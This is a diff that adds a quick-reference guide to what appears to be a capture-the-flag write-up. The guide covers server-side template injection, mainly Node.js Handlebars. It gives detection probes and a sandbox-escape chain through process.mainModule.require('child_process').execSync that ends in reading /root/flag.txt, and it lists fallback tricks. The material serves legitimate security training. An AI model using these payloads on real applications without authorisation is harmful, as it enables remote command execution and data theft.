@@ -355,3 +355,94 @@ flag.txt
 
 **Status:** ✅ FLAG CAPTURED - ROOT ACCESS ACHIEVED
 
+---
+
+## Quick Reference: SSTI Detection & Exploitation Guide
+
+### 🔍 How to Identify SSTI
+
+| Test | Syntax | Response | Meaning |
+|------|--------|----------|---------|
+| Basic Math | `{{7*7}}` | `49` or error | SSTI likely present |
+| Template Engine Leak | `{{7*7}}` | Error message | Reveals template engine name |
+| Object Access | `{{process}}` | [object Object] or error | Indicates which objects are accessible |
+
+### 🎯 Template Engine Identification
+
+When you see an error, look for keywords to identify the engine:
+
+| Engine | Keywords in Error | Exploit Resource |
+|--------|------------------|------------------|
+| **Handlebars** | "Handlebars", "handlebars" | [HackTricks - Handlebars SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/handlebars-ssti) |
+| **Jinja2** | "jinja", "undefined variable" | [PayloadsAllTheThings - Jinja2](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) |
+| **Freemarker** | "freemarker", "FreeMarker" | [HackTricks - Freemarker SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection) |
+| **Twig** | "twig", "Twig" | [PayloadsAllTheThings - Twig](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) |
+| **ERB** | "erb", "Rails" | [HackTricks - ERB SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection) |
+
+### 🚀 Node.js/Handlebars Exploitation Steps
+
+When you identify **Handlebars** SSTI:
+
+```
+1. Test basic injection: {{7*7}}
+2. Try direct require: {{require('child_process').execSync('whoami')}}
+   └─ If fails: "require is not defined" → proceed to step 3
+   
+3. Escape sandbox via process.mainModule:
+   a. Test: return process;
+   b. Test: return process.mainModule;
+   c. Load module: return process.mainModule.require('child_process');
+   d. Execute: return process.mainModule.require('child_process').execSync('COMMAND');
+
+4. Capture output in response
+5. Modify command as needed (whoami → ls /root → cat /root/flag.txt)
+```
+
+### 📚 Essential Resource Links
+
+**General SSTI:**
+- [HackTricks - SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
+- [PayloadsAllTheThings - SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
+
+**Handlebars Specific:**
+- [HackTricks - Handlebars](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/handlebars-ssti)
+- [Node.js process.mainModule Documentation](https://nodejs.org/api/process.html#process_process_mainmodule)
+
+**Burp Suite for SSTI:**
+- Intercept POST/GET requests
+- URL-encode payloads before sending
+- Use Repeater tab for iterative testing
+
+### 💡 Key Insights for Similar Boxes
+
+1. **Sandbox Escapes in Node.js:**
+   - If `require()` blocked → try `process.mainModule.require()`
+   - If that blocked → try `this.constructor.constructor()`
+   - Look for deprecated but still-accessible APIs
+
+2. **Testing Methodology:**
+   - Start simple: `{{7*7}}`
+   - Enumerate what's available: `{{process}}`
+   - Build chains incrementally
+   - Each step should get a valid response (not error)
+
+3. **Payload Encoding:**
+   - Most input fields need URL encoding for payloads to work
+   - Test in browser first, then move to Burp for complex payloads
+   - Single quotes vs double quotes matter
+
+4. **Command Output:**
+   - Output appears in response body or error messages
+   - May be embedded in HTML/JSON
+   - Use grep/strings if output is mixed with other data
+
+### ⚠️ Common Mistakes to Avoid
+
+- ❌ Testing payload without URL encoding
+- ❌ Forgetting to chain `.execSync()` - use Sync versions for output capture
+- ❌ Not checking error messages - they reveal the engine!
+- ❌ Assuming `require()` is always blocked - try alternatives first
+- ❌ Running commands that hang (don't use `exec()` without timeout)
+
+---
+
